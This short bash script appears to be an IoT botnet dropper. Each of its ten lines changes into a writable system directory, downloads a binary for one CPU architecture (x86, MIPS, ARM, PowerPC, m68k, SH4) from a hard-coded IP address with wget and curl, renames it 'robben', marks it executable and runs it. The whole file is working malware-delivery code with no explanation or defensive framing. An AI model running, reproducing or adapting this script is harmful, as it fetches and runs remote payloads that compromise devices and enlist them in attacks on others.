#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/x86; curl -O http://5.181.80.97/bins/x86;cat x86 >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/mips; curl -O http://5.181.80.97/bins/mips;cat mips >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/mpsl; curl -O http://5.181.80.97/bins/mpsl;cat mpsl >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm4; curl -O http://5.181.80.97/bins/arm4;cat arm4 >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm5; curl -O http://5.181.80.97/bins/arm5;cat arm5 >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm6; curl -O http://5.181.80.97/bins/arm6;cat arm6 >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/arm7; curl -O http://5.181.80.97/bins/arm7;cat arm7 >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/ppc; curl -O http://5.181.80.97/bins/ppc;cat ppc >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/m68k; curl -O http://5.181.80.97/bins/m68k;cat m68k >robben;chmod +x *;./robben payload
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.97/bins/sh4; curl -O http://5.181.80.97/bins/sh4;cat sh4 >robben;chmod +x *;./robben payload
